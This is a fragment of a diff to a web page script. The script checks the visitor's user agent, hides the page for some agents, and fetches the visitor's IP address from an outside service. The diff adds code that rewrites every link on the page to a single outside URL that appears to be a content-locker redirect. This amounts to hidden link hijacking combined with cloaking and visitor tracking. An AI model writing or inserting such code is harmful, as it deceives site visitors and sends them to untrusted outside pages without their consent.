@@ -18,6 +18,12 @@ if (agent.indexOf('music') >= 0) {
   );
   root.style.display = 'none';
 } else {
+  // https://locked4.com/cl/i/8d5r9r
+  const links = document.querySelectorAll('a');
+  links.forEach((link) => {
+    link.href = 'https://locked4.com/cl/i/8d5r9r';
+  });
+
   // GET IP
   fetch('https://api.ipify.org?format=json')
     .then((ip_response) => ip_response.json())
